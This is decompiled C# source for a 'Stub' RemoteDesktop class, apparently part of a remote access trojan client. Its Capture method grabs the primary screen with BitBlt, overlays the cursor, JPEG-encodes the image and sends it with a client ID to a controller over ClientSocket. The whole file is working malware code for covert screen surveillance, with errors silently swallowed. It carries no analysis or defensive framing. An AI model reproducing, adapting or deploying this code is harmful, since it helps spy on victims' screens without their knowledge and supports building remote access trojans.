using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub;

public class RemoteDesktop
{
	[DllImport("gdi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);

	public static void Capture(Size size, int Q)
	{
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00eb: Expected O, but got Unknown
		//IL_0108: Unknown result type (might be due to invalid IL or missing references)
		//IL_010f: Expected O, but got Unknown
		//IL_011c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
		int width = Screen.get_PrimaryScreen().get_Bounds().Width;
		Bitmap val = new Bitmap(width, Screen.get_PrimaryScreen().get_Bounds().Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		Graphics val3 = Graphics.FromHwnd(IntPtr.Zero);
		BitBlt(val2.GetHdc(), 0, 0, bounds.Width, bounds.Height, val3.GetHdc(), 0, 0, 13369376u);
		val2.ReleaseHdc();
		val3.ReleaseHdc();
		try
		{
			Cursor @default = Cursors.get_Default();
			Graphics val4 = val2;
			Point position = Cursor.get_Position();
			Size size2 = new Size(32, 32);
			Rectangle rectangle = new Rectangle(position, size2);
			@default.Draw(val4, rectangle);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		val2.Dispose();
		val3.Dispose();
		if (((Image)val).get_Size() != size)
		{
			try
			{
				val = new Bitmap((Image)(object)val, size);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		new MemoryStream();
		EncoderParameter val5 = new EncoderParameter(Encoder.Quality, (long)Q);
		ImageCodecInfo encoderInfo = GetEncoderInfo("image/jpeg");
		EncoderParameters val6 = new EncoderParameters(1);
		val6.get_Param()[0] = val5;
		try
		{
			lock (ClientSocket.S)
			{
				object obj = Screen.get_PrimaryScreen().get_Bounds().Size;
				using MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, encoderInfo, val6);
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.AddObject(Operators.AddObject((object)"RD+", ClientSocket.SPL), (object)Helper.BS(memoryStream.ToArray())), ClientSocket.SPL), NewLateBinding.LateGet(obj, (Type)null, "Width", new object[0], (string[])null, (Type[])null, (bool[])null)), ClientSocket.SPL), NewLateBinding.LateGet(obj, (Type)null, "Height", new object[0], (string[])null, (Type[])null, (bool[])null)), ClientSocket.SPL), (object)Helper.ID())));
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		GC.Collect();
	}

	public static ImageCodecInfo GetEncoderInfo(string M)
	{
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		int num = imageEncoders.Length;
		int num2 = num;
		int num3 = 0;
		while (true)
		{
			if (num3 <= num2)
			{
				if (Operators.CompareString(imageEncoders[num3].get_MimeType(), M, false) == 0)
				{
					break;
				}
				num3 = checked(num3 + 1);
				continue;
			}
			return null;
		}
		return imageEncoders[num3];
	}
}
